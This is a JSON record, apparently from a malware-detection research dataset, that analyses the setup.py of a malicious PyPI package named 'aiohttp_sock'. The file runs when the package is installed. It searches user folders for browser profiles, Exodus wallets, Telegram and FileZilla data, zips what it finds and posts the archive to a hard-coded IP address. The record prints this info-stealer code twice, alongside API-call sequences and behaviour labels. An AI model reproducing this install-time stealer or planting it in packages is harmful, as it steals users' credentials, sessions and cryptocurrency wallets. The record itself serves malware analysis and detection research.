[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/aiohttp_sock-0.1.21/aiohttp_sock-0.1.21/setup.py",
    "code_snippet": "import subprocess\nimport sys\n\nif len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]:\n    subprocess.call(f'{sys.executable} -m pip install aiofiles')\n    subprocess.call(f'{sys.executable} -m pip install aiohttp')\n    subprocess.call(f'{sys.executable} -m pip install cryptography')\n    subprocess.call(f'{sys.executable} -m pip install aiosqlite')\n    import contextlib as __stickytape_contextlib\n\n    @__stickytape_contextlib.contextmanager\n    def __stickytape_temporary_dir():\n        import tempfile\n        import shutil\n        dir_path = tempfile.mkdtemp()\n        try:\n            yield dir_path\n        finally:\n            shutil.rmtree(dir_path)\n\n    with __stickytape_temporary_dir() as __stickytape_working_dir:\n        def __stickytape_write_module(path, contents):\n            import os, os.path\n\n            def make_package(path):\n                parts = path.split(\"/\")\n                partial_path = __stickytape_working_dir\n                for part in parts:\n                    partial_path = os.path.join(partial_path, part)\n                    if not os.path.exists(partial_path):\n                        os.mkdir(partial_path)\n                        with open(os.path.join(partial_path, \"__init__.py\"), \"wb\") as f:\n                            f.write(b\"\\n\")\n\n            make_package(os.path.dirname(path))\n\n            full_path = os.path.join(__stickytape_working_dir, path)\n            with open(full_path, \"wb\") as module_file:\n                module_file.write(contents)\n\n        import sys as __stickytape_sys\n        __stickytape_sys.path.insert(0, __stickytape_working_dir)\n\n        # The following modules are written to disk and then imported/executed\n        __stickytape_write_module('path_search.py', b\"import asyncio\\r\\nimport os\\r\\nfrom os.path import join, isdir\\r\\nfrom typing import Dict, Iterable, List\\r\\nfrom tools import _handle_task_result\\r\\n\\r\\n\\r\\nLOCAL = os.environ['USERPROFILE']\\r\\n\\r\\nroot_paths = {\\r\\n    join(LOCAL, 'appdata'),\\r\\n    join(LOCAL, 'appdata', 'local'),\\r\\n    join(LOCAL, 'appdata', 'roaming'),\\r\\n    join(LOCAL, 'documents'),\\r\\n    join(LOCAL, 'downloads'),\\r\\n    join(LOCAL, 'desktop'),\\r\\n    'C:\\\\',\\r\\n    'D:\\\\',\\r\\n    'E:\\\\',\\r\\n    'C:\\\\Program Files',\\r\\n    'C:\\\\Program Files (x86)',\\r\\n    'C:\\\\\\\\ProgramData'\\r\\n\\r\\n}\\r\\n\\r\\n\\r\\nasync def search_plugin_paths(paths: Iterable[str], queries: Dict):\\r\\n    tasks: List[asyncio.Task] = []\\r\\n\\r\\n    queries = {k.lower(): v for k,v in queries.items()}\\r\\n    target_folder_names = set(queries.keys())\\r\\n    for p in paths:\\r\\n        if isdir(p):\\r\\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\\r\\n                if queries[fname] is not None:\\r\\n                    curr_path = join(p, fname)\\r\\n                    loop = asyncio.get_event_loop()\\r\\n                    task = loop.create_task(queries[fname].callback(curr_path))\\r\\n                    task.add_done_callback(_handle_task_result)\\r\\n                    tasks.append(task)\\r\\n\\r\\n    for task in tasks:\\r\\n        try:\\r\\n            await task\\r\\n        except Exception as e:\\r\\n            print(repr(e))\\r\\n\\r\\n\\r\\nasync def search_paths(paths: Iterable[str], queries: Iterable):\\r\\n    target_folder_names = {i.lower() for i in queries}\\r\\n    for p in paths:\\r\\n        if isdir(p):\\r\\n            for fname in target_folder_names.intersection(i.name.lower() for i in os.scandir(p)):\\r\\n                if fname in target_folder_names:\\r\\n                    yield join(p, fname)\\r\\n\")\n        # ... (other modules written, see original code)\n        import asyncio\n        from asyncio import create_task\n        from typing import List\n        from weakref import proxy\n        from path_search import search_plugin_paths, root_paths\n        from config import Config\n        from aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData,\\\n                TCPConnector\n        import secrets\n        import timeit\n        from paths import TEMP\n        from os import mkdir\n        from os.path import join\n        from zipfile import ZipFile, ZIP_DEFLATED\n        from tools import zipdir, _handle_task_result\n        from logger import Logger\n        \n        from plugins import Chromium, Details, Exodus, Filezilla, Telegram\n        \n        \n        \n        HOST = 'http://144.24.115.170'\n        \n        \n        async def main() -> None:\n            start = timeit.default_timer()\n        \n            client_id = secrets.token_hex(10)\n            log_path = join(TEMP, client_id)\n        \n            print(log_path)\n            mkdir(log_path)\n        \n            tasks: List[asyncio.Task] = []\n        \n            connector = TCPConnector(limit=50)\n            session = Session(connector=connector)\n            logger = Logger(log_path)\n            conf = Config(client_id, HOST, log_path, logger, session)\n        \n            await logger.log(f'Start')\n            \n            chromium = Chromium(conf)\n        \n            search_folder_names = {\n                'google': chromium,\n                'exodus': Exodus(conf),\n                'mozilla': None,\n                'telegram desktop': Telegram(conf),\n                'telegram': Telegram(conf),\n                'opera software': chromium,\n                'filezilla': Filezilla(conf)\n            }\n            \n            tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n        \n            other_plugins = [Details(conf)]\n        \n            for plugin in other_plugins:\n                tasks.append(create_task(plugin.callback()))\n        \n            for task in tasks:\n                task.add_done_callback(_handle_task_result)\n        \n            for task in tasks:\n                try:\n                    await task\n                except Exception as e:\n                    await logger.log(f'Error in main.py tasks {e}')\n            \n            await logger.log(f'═рўшэр■ юЄяЁртъє ыюур')\n        \n            zip_log_path = join(TEMP, f'{client_id}.zip')\n            with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n                zipdir(log_path, zipf)\n        \n            files = {'file': open(zip_log_path, 'rb')}\n                \n            await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)\n            await session.close()\n        \n            stop = timeit.default_timer()\n            await logger.log(f'Time: {stop-start}')\n        \n        asyncio.run(main())",
    "pattern_analysis": {
      "api_sequence": [
        "sys.argv",
        "subprocess.call",
        "subprocess.call",
        "subprocess.call",
        "subprocess.call",
        "tempfile.mkdtemp",
        "shutil.rmtree",
        "os.path.join",
        "os.path.exists",
        "os.mkdir",
        "open",
        "open",
        "os.path.join",
        "open",
        "os.path.join",
        "open",
        "sys.path.insert",
        "os.environ",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.isdir",
        "os.scandir",
        "asyncio.get_event_loop",
        "asyncio.get_event_loop.create_task",
        "asyncio.Task.add_done_callback",
        "asyncio.Task",
        "asyncio.Task",
        "asyncio.Task",
        "asyncio.Task",
        "os.path.isdir",
        "os.scandir",
        "os.path.join",
        "os.path.exists",
        "os.mkdir",
        "open",
        "open",
        "os.path.join",
        "open",
        "os.path.join",
        "open",
        "sys.path.insert",
        "os.environ",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.join",
        "os.path.isdir",
        "os.scandir",
        "asyncio.get_event_loop",
        "asyncio.get_event_loop.create_task",
        "asyncio.Task.add_done_callback",
        "asyncio.Task",
        "asyncio.Task",
        "asyncio.Task",
        "asyncio.Task",
        "timeit.default_timer",
        "secrets.token_hex",
        "os.path.join",
        "print",
        "os.mkdir",
        "aiohttp.TCPConnector",
        "aiohttp.ClientSession",
        "Logger.log",
        "Chromium",
        "Exodus",
        "Telegram",
        "Telegram",
        "Chromium",
        "Filezilla",
        "asyncio.create_task",
        "Details",
        "asyncio.create_task",
        "asyncio.Task.add_done_callback",
        "asyncio.Task",
        "Logger.log",
        "os.path.join",
        "zipfile.ZipFile",
        "zipdir",
        "open",
        "aiohttp.ClientSession.post",
        "aiohttp.ClientSession.close",
        "timeit.default_timer",
        "Logger.log",
        "asyncio.run"
      ],
      "api_sequence_with_args": [
        "sys.argv",
        "subprocess.call(f'{sys.executable} -m pip install aiofiles')",
        "subprocess.call(f'{sys.executable} -m pip install aiohttp')",
        "subprocess.call(f'{sys.executable} -m pip install cryptography')",
        "subprocess.call(f'{sys.executable} -m pip install aiosqlite')",
        "tempfile.mkdtemp()",
        "shutil.rmtree(dir_path)",
        "os.path.join(partial_path, part)",
        "os.path.exists(partial_path)",
        "os.mkdir(partial_path)",
        "open(os.path.join(partial_path, \"__init__.py\"), \"wb\")",
        "open(full_path, \"wb\")",
        "os.path.join(__stickytape_working_dir, path)",
        "open(full_path, \"wb\")",
        "os.path.join(__stickytape_working_dir, path)",
        "open(full_path, \"wb\")",
        "sys.path.insert(0, __stickytape_working_dir)",
        "os.environ['USERPROFILE']",
        "os.path.join(LOCAL, 'appdata')",
        "os.path.join(LOCAL, 'appdata', 'local')",
        "os.path.join(LOCAL, 'appdata', 'roaming')",
        "os.path.join(LOCAL, 'documents')",
        "os.path.join(LOCAL, 'downloads')",
        "os.path.join(LOCAL, 'desktop')",
        "os.path.join(LOCAL, 'C:\\')",
        "os.path.join(LOCAL, 'D:\\')",
        "os.path.join(LOCAL, 'E:\\')",
        "os.path.join(LOCAL, 'C:\\Program Files')",
        "os.path.join(LOCAL, 'C:\\Program Files (x86)')",
        "os.path.join(LOCAL, 'C:\\\\ProgramData')",
        "os.path.isdir(p)",
        "os.scandir(p)",
        "asyncio.get_event_loop()",
        "asyncio.get_event_loop().create_task(queries[fname].callback(curr_path))",
        "asyncio.Task.add_done_callback(_handle_task_result)",
        "asyncio.Task",
        "asyncio.Task",
        "asyncio.Task",
        "asyncio.Task",
        "os.path.isdir(p)",
        "os.scandir(p)",
        "os.path.join(p, fname)",
        "os.path.exists(partial_path)",
        "os.mkdir(partial_path)",
        "open(os.path.join(partial_path, \"__init__.py\"), \"wb\")",
        "open(full_path, \"wb\")",
        "os.path.join(__stickytape_working_dir, path)",
        "open(full_path, \"wb\")",
        "os.path.join(__stickytape_working_dir, path)",
        "open(full_path, \"wb\")",
        "sys.path.insert(0, __stickytape_working_dir)",
        "os.environ['USERPROFILE']",
        "os.path.join(LOCAL, 'appdata')",
        "os.path.join(LOCAL, 'appdata', 'local')",
        "os.path.join(LOCAL, 'appdata', 'roaming')",
        "os.path.join(LOCAL, 'documents')",
        "os.path.join(LOCAL, 'downloads')",
        "os.path.join(LOCAL, 'desktop')",
        "os.path.join(LOCAL, 'C:\\')",
        "os.path.join(LOCAL, 'D:\\')",
        "os.path.join(LOCAL, 'E:\\')",
        "os.path.join(LOCAL, 'C:\\Program Files')",
        "os.path.join(LOCAL, 'C:\\Program Files (x86)')",
        "os.path.join(LOCAL, 'C:\\\\ProgramData')",
        "os.path.isdir(p)",
        "os.scandir(p)",
        "asyncio.get_event_loop()",
        "asyncio.get_event_loop().create_task(queries[fname].callback(curr_path))",
        "asyncio.Task.add_done_callback(_handle_task_result)",
        "asyncio.Task",
        "asyncio.Task",
        "asyncio.Task",
        "asyncio.Task",
        "timeit.default_timer()",
        "secrets.token_hex(10)",
        "os.path.join(TEMP, client_id)",
        "print(log_path)",
        "os.mkdir(log_path)",
        "aiohttp.TCPConnector(limit=50)",
        "aiohttp.ClientSession(connector=connector)",
        "Logger.log(f'Start')",
        "Chromium(conf)",
        "Exodus(conf)",
        "Telegram(conf)",
        "Telegram(conf)",
        "Chromium(conf)",
        "Filezilla(conf)",
        "asyncio.create_task(search_plugin_paths(root_paths, search_folder_names))",
        "Details(conf)",
        "asyncio.create_task(plugin.callback())",
        "asyncio.Task.add_done_callback(_handle_task_result)",
        "asyncio.Task",
        "Logger.log(f'Error in main.py tasks {e}')",
        "os.path.join(TEMP, f'{client_id}.zip')",
        "zipfile.ZipFile(zip_log_path, 'w', ZIP_DEFLATED)",
        "zipdir(log_path, zipf)",
        "open(zip_log_path, 'rb')",
        "aiohttp.ClientSession.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)",
        "aiohttp.ClientSession.close()",
        "timeit.default_timer()",
        "Logger.log(f'Time: {stop-start}')",
        "asyncio.run(main())"
      ],
      "mapped_sequence": [
        {
          "api_name": "sys.argv",
          "id": "get_cmd_args",
          "description": "Retrieves command-line arguments passed to script",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "subprocess.call",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "tempfile.mkdtemp",
          "id": "create_temp_dir",
          "description": "Creates temporary directory and returns its path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "shutil.rmtree",
          "id": "delete_directory",
          "description": "Recursively deletes directory and its contents",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.mkdir",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "sys.path.insert",
          "id": "insert_module_path",
          "description": "Inserts directory at start of module search path",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "module_importing"
        },
        {
          "api_name": "os.environ",
          "id": "get_env_vars",
          "description": "Retrieves environment variables mapping",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.isdir",
          "id": "check_directory_exists",
          "description": "Checks if specified path exists and is a directory",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.scandir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "asyncio.get_event_loop",
          "id": "run_async_function",
          "description": "Runs asynchronous function until completion",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "asyncio.get_event_loop.create_task",
          "id": "create_async_task",
          "description": "Creates asynchronous task for coroutine",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "asyncio.Task.add_done_callback",
          "id": "submit_thread_function",
          "description": "Submits function to thread pool for execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_pool_management"
        },
        {
          "api_name": "timeit.default_timer",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "secrets.token_hex",
          "id": "serialize_to_json",
          "description": "Serializes Python object to JSON string",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.mkdir",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "aiohttp.TCPConnector",
          "id": "create_http_connection",
          "description": "Creates HTTP connection to specified host",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "aiohttp.ClientSession",
          "id": "create_http_session",
          "description": "Creates HTTP session for making asynchronous requests",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_creation"
        },
        {
          "api_name": "Logger.log",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "asyncio.create_task",
          "id": "create_async_task",
          "description": "Creates asynchronous task for coroutine",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "asyncio.Task.add_done_callback",
          "id": "submit_thread_function",
          "description": "Submits function to thread pool for execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_pool_management"
        },
        {
          "api_name": "Logger.log",
          "id": "log_error",
          "description": "Logs error message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipdir",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "aiohttp.ClientSession.post",
          "id": "open_url_post",
          "description": "Opens URL with POST data",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "aiohttp.ClientSession.close",
          "id": "close_http_response",
          "description": "Closes the HTTP response object",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "timeit.default_timer",
          "id": "get_current_time",
          "description": "Returns current time in seconds since epoch",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "Logger.log",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "asyncio.run",
          "id": "run_async_function",
          "description": "Runs asynchronous function until completion",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        }
      ],
      "contextual_code": "import subprocess\nimport sys\n\nif len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]:\n    subprocess.call(f'{sys.executable} -m pip install aiofiles')\n    subprocess.call(f'{sys.executable} -m pip install aiohttp')\n    subprocess.call(f'{sys.executable} -m pip install cryptography')\n    subprocess.call(f'{sys.executable} -m pip install aiosqlite')\n    import contextlib as __stickytape_contextlib\n\n    @__stickytape_contextlib.contextmanager\n    def __stickytape_temporary_dir():\n        import tempfile\n        import shutil\n        dir_path = tempfile.mkdtemp()\n        try:\n            yield dir_path\n        finally:\n            shutil.rmtree(dir_path)\n\n    with __stickytape_temporary_dir() as __stickytape_working_dir:\n        def __stickytape_write_module(path, contents):\n            import os, os.path\n\n            def make_package(path):\n                parts = path.split(\"/\")\n                partial_path = __stickytape_working_dir\n                for part in parts:\n                    partial_path = os.path.join(partial_path, part)\n                    if not os.path.exists(partial_path):\n                        os.mkdir(partial_path)\n                        with open(os.path.join(partial_path, \"__init__.py\"), \"wb\") as f:\n                            f.write(b\"\\n\")\n\n            make_package(os.path.dirname(path))\n\n            full_path = os.path.join(__stickytape_working_dir, path)\n            with open(full_path, \"wb\") as module_file:\n                module_file.write(contents)\n\n        import sys as __stickytape_sys\n        __stickytape_sys.path.insert(0, __stickytape_working_dir)\n\n        # ...\n        import asyncio\n        from asyncio import create_task\n        from typing import List\n        from weakref import proxy\n        from path_search import search_plugin_paths, root_paths\n        from config import Config\n        from aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData,\\\n                TCPConnector\n        import secrets\n        import timeit\n        from paths import TEMP\n        from os import mkdir\n        from os.path import join\n        from zipfile import ZipFile, ZIP_DEFLATED\n        from tools import zipdir, _handle_task_result\n        from logger import Logger\n        from plugins import Chromium, Details, Exodus, Filezilla, Telegram\n\n        HOST = 'http://144.24.115.170'\n\n        async def main() -> None:\n            start = timeit.default_timer()\n            client_id = secrets.token_hex(10)\n            log_path = join(TEMP, client_id)\n            print(log_path)\n            mkdir(log_path)\n            tasks: List[asyncio.Task] = []\n            connector = TCPConnector(limit=50)\n            session = Session(connector=connector)\n            logger = Logger(log_path)\n            conf = Config(client_id, HOST, log_path, logger, session)\n            await logger.log(f'Start')\n            chromium = Chromium(conf)\n            search_folder_names = {\n                'google': chromium,\n                'exodus': Exodus(conf),\n                'mozilla': None,\n                'telegram desktop': Telegram(conf),\n                'telegram': Telegram(conf),\n                'opera software': chromium,\n                'filezilla': Filezilla(conf)\n            }\n            tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n            other_plugins = [Details(conf)]\n            for plugin in other_plugins:\n                tasks.append(create_task(plugin.callback()))\n            for task in tasks:\n                task.add_done_callback(_handle_task_result)\n            for task in tasks:\n                try:\n                    await task\n                except Exception as e:\n                    await logger.log(f'Error in main.py tasks {e}')\n            await logger.log(f'═рўшэр■ юЄяЁртъє ыюур')\n            zip_log_path = join(TEMP, f'{client_id}.zip')\n            with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n                zipdir(log_path, zipf)\n            files = {'file': open(zip_log_path, 'rb')}\n            await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)\n            await session.close()\n            stop = timeit.default_timer()\n            await logger.log(f'Time: {stop-start}')\n        asyncio.run(main())"
    }
  }
]